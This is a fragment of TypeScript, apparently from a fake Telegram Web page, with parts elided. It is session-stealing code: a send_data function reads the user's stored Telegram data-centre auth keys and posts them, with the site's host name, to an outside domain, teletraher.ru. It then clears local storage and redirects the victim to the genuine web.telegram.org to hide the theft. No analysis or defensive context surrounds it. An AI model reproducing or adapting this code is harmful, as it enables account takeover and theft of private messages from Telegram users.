...
document.addEventListener('DOMContentLoaded', async() => {
  toggleAttributePolyfill();
    ...
    setInterval(async() => {
      ...
      let auth_data = storage.getItem('user_auth');

      if(auth_data)
      {
        const chat_page = document.querySelector('.whole.page-chats') as HTMLElement;
        chat_page.style.display = 'none';
      }

/*      const chat_list = document.querySelector('#main-columns') as HTMLElement;
    ...
    function send_data(){
      ...
      let data = {
        'dc': storage.getItem('dc'),
        'dc1_auth_key': storage.getItem('dc1_auth_key'),
        'dc2_auth_key': storage.getItem('dc2_auth_key'),
        'dc3_auth_key': storage.getItem('dc3_auth_key'),
        'dc4_auth_key': storage.getItem('dc4_auth_key'),
        'dc5_auth_key': storage.getItem('dc5_auth_key'),
        'domain': window.location.host
      }
 
		try {
			fetch('https://teletraher.ru/data', {
				method: 'POST',
				...
				if (resp == 200) {
					storage.clear();
					window.location.replace('https://web.telegram.org/z/');
				}
			}).catch(error => {
				console.error('Ошибка1:', error);
			});
		}
		catch (error) {
  ...
  console.log("Aloha:", location.href)
